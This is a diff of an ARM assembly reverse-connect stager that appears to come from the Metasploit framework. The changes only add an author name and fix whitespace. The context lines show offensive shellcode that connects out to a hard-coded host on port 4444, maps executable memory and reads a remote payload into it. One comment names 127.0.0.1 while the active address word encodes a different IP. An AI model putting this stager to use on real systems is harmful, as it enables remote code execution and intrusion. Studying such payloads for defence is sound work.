@@ -2,7 +2,7 @@
 @
 @        Name: stager_sock_reverse
 @   Qualities: -
-@     Authors: nemo <nemo [at] felinemenace.org>
+@     Authors: nemo <nemo [at] felinemenace.org>, tkmru
 @     License: MSF_LICENSE
 @ Description:
 @
@@ -37,7 +37,7 @@ _start:
 	cmp r0, #0
 	blt failed
 @ int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-    mov r12,r0         @ sockfd
+  mov r12,r0         @ sockfd
 	add r7,#2          @ __NR_socket
 	add r1,pc,#196     @ *addr
 	mov r2,#16         @ addrlen
@@ -45,7 +45,7 @@ _start:
 	cmp r0, #0
 	blt failed
 @ ssize_t recv(int sockfd, void *buf, size_t len, int flags);
-    mov r0,r12         @ sockfd
+  mov r0,r12         @ sockfd
 	sub sp,#4
 	add r7,#8          @ __NR_recv
 	mov r1,sp          @ *buf (on the stack)
@@ -65,7 +65,7 @@ _start:
 	mov r7, #192       @ __NR_mmap2
 	ldr r0,=0xffffffff @ *addr = NULL
 	mov r2,#7          @ prot  = PROT_READ | PROT_WRITE | PROT_EXEC
-    ldr r3,=0x1022     @ flags = MAP_ANON | MAP_PRIVATE
+  ldr r3,=0x1022     @ flags = MAP_ANON | MAP_PRIVATE
 	mov r4,r0          @ fd
 	mov r5,#0          @ pgoffset
 	swi 0
@@ -85,7 +85,7 @@ loop:
 	cmp r2, #0
 	ble last
 	mov r2,#1000       @ len
-	swi 0	
+	swi 0
 	cmp r0, #0
 	blt failed
 	b loop
@@ -102,7 +102,7 @@ failed:
 	swi 0
 @ addr
 @ port: 4444 , sin_fam = 2
-.word   0x5c110002 
+.word   0x5c110002
 @ ip: 127.0.0.1
 .word   0x01aca8c0
 @.word   0x0100007f
